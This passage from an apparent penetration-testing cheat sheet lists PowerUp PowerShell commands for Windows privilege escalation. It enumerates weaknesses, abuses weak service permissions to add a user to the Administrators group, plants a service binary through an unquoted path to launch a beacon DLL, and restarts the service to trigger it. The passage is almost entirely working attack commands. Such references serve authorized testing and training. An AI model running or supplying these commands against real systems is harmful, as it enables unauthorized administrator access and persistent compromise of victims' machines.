For more things to look for (both Windows and Linux), refer to my [OSCP cheat sheet and command reference](https://cas.vancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/).

### PowerUp

```powershell
# Check for vulnerable programs and configs
Invoke-AllChecks

# Exploit vulnerable service permissions (does not require touching disk)
Invoke-ServiceAbuse -Name "VulnerableSvc" -Command "net localgroup Administrators DOMAIN\user /add"

# Exploit an unquoted service path vulnerability to spawn a beacon
Write-ServiceBinary -Name 'VulnerableSvc' -Command 'c:\windows\system32\rundll32 c:\Users\Public\beacon.dll,Update' -Path 'C:\Program Files\VulnerableSvc'

# Restart the service to exploit (not always required)
net.exe stop VulnerableSvc
net.exe start VulnerableSvc
```